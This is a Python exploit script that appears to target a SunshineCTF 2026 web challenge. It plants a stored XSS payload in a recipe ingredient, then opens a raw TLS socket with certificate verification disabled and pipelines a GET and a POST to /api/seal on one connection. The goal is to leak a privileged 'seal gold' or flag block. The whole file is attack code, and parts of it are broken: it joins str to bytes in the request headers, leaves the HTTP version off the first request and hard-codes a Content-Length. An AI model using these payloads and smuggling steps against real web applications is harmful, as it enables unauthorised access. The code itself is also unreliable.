#!/usr/bin/env python3 -u
import sys,time,socket,ssl,json,re;sys.path.insert(0,'.')
from cc import Client
BASE="https://tomorrow.web.2026.sunshinectf.games"
def log(*a):sys.stdout.buffer.write((" ".join(str(x) for x in a)+"\n").encode("utf-8","replace"));sys.stdout.flush()

log("=== registering and setting up batch ===")
c=Client();code,out,_=c.post("/register",{"username":"smp%05d"%(time.time()%100000),"password":"Passw0rd!"});u=out["user"]
code,out,_=c.post("/api/recipe",{"title":"probe","ingredients":[{"name":"xss","value":"</script><script>alert('got')</script>"}]})
rid=out["id"];c.post("/api/recipe/%s/submit"%rid,{});time.sleep(10);c.post("/login",{"username":u,"password":"Passw0rd!"});c.get("/dashboard")
session=c.jar.get("session");role=c.jar.get("role")
if not session:log("No session");sys.exit(1)
log("User %s, rid=%s, session_len=%d" % (u, rid, len(session)))

# RAW SMOG #1: double request on same connection
ctx=ssl.create_default_context()
ctx.check_hostname=False;ctx.verify_mode=ssl.CERT_NONE
try:
    s=ctx.wrap_socket(socket.create_connection((BASE.split("//")[1],443),timeout=25),server_hostname=BASE.split("//")[1])
    req1=b"GET /review/"+rid.encode()+b"\r\nHost: "+BASE.split("//")[1].encode()+b"\r\nCookie: session="+session.encode()+"; role="+role.encode()+b"\r\n\r\n"
    s.sendall(req1)
    time.sleep(0.3)
    req2=b"POST /api/seal HTTP/1.1\r\nHost: "+BASE.split("//")[1].encode()+b"\r\nContent-Type: application/json\r\nContent-Length: 40\r\nConnection: close\r\nCookie: session="+session.encode()+"; role="+role.encode()+b"\r\n\r\n"+json.dumps({"recipeId":rid}).encode()
    s.sendall(req2)
    resp=s.recv(16384)[:20000]
    s.close()
except Exception as e:log("Error:",e);sys.exit(1)

log("Response length:",len(resp))
log("Has 'seal'?",b"seal" in resp.lower())
log("Has 'error'?",b"error" in resp.lower())
log("Has alert script?",b"<script>alert" in resp)
log("Has golden class?",rb'class="seal gold"' in resp or rb'class="flag"' in resp)

resp_str=resp.decode(errors="replace")
if re.search(r'class="seal gold"|class="flag"',resp_str):
    log("!!! GOLDEN BLOCK FOUND IN RAW RESPONSE")
else:
    log("No obvious leakage detected")

log("Done")
